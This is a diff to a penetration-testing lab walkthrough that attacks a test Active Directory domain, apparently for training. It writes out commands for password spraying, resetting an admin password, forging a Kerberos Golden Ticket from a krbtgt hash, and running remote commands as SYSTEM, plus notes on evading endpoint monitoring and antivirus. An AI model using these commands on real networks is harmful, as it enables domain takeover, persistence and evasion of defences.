@@ -11,6 +11,9 @@ Command:
 
 ```bash
 nxc smb 192.168.56.20 -u 'bh_helpdesk' -p 'User@2025!' --continue-on-success
+```
+
+```bash
 bloodyad -u bh_helpdesk -p 'User@2025!' -d PENTESTLAB.local --host 192.168.56.20 set password bh_sysadmin 'password1234'
 
 ```
@@ -86,6 +89,21 @@ Brief Explanation:
 
 ### Our next mission is: Enumerate domain baseline security identifiers and forge an ephemeral, persistent Kerberos Golden Ticket
 
+Before make sure to add:
+
+```bash
+echo "192.168.56.20 pentestlab.local" | sudo tee -a /etc/hosts
+```
+
+and
+
+If you know hostname of DC, add:
+
+```bash
+echo "192.168.56.20 dc01.pentestlab.local dc01" | sudo tee -a /etc/hosts
+```
+
+
 Blueprint:
 `impacket-lookupsid [1. Domain]/[2. Username]:'[3. Password]'@[4. Target DC IP] [5. Scope Index]`
 `impacket-ticketer -nthash [6. KRBTGT Hash] -domain-sid "[7. Domain SID String]" -domain [8. Domain Name] [9. Target Identity]`
@@ -94,6 +112,9 @@ Command:
 
 ```bash
 impacket-lookupsid PENTESTLAB.local/bh_sysadmin:'password1234'@192.168.56.20 0
+```
+
+```bash
 impacket-ticketer -nthash 5bc68a017e37f5da683a3e4128630abc -domain-sid "S-1-5-21-281050671-1125578517-3338290938" -domain PENTESTLAB.local Administrator
 
 ```
@@ -136,9 +157,9 @@ Explanation:
 * `export KRB5CCNAME=Administrator.ccache`: Injects the path of the forged Kerberos ticket into the local environment environment space, forcing all compatible Linux networking utilities to use the file for authentication actions.
 * `dc01.pentestlab.local`: Specifies the target Domain Controller using its fully qualified domain name (FQDN), a structural prerequisite for processing Kerberos tickets correctly.
 * `--use-kcache`: Directs the underlying platform to ignore standard username/password arguments and instead pull the active forged ticket token directly from memory.
-* `nxc smb ... -x "net users /domain"`: Attempts command invocation via default SMB remote management setups (`wmiexec` over port 445). The target host indicates a successful compromise (`Pwn3d!`), but defensive endpoint monitoring blocks the output data file collection process.
+* `nxc smb ... -x "net users /domain"`: Attempts command invocation via default SMB remote management setups (`wmiexec` over port 445). The target host indicates a successful compromise (`Pwn3d!`), but defensive endpoint monitoring can block the output data file collection process.
 * `nxc wmi ...`: Shifts the entire communication protocol away from SMB over to the Windows Management Instrumentation (WMI) engine on port 135. This successfully evades the security monitoring bottleneck to cleanly output the full domain user directory list.
-* `--exec-method atexec -x "whoami"`: Adjusts the remote command invocation method to leverage the Task Scheduler service (`atexec`). This schedules an ephemeral application instance on the target system to execute code directly under the highest machine privilege structure: `nt authority\system`.
+* `--exec-method atexec -x "whoami"`: Adjusts the remote command invocation method to leverage the Task Scheduler service (`atexec`). This schedules an ephemeral application instance on the target system to execute code directly under the highest machine privilege structure: `nt authority\system`. This can bypass AV.
 
 Brief Explanation:
 
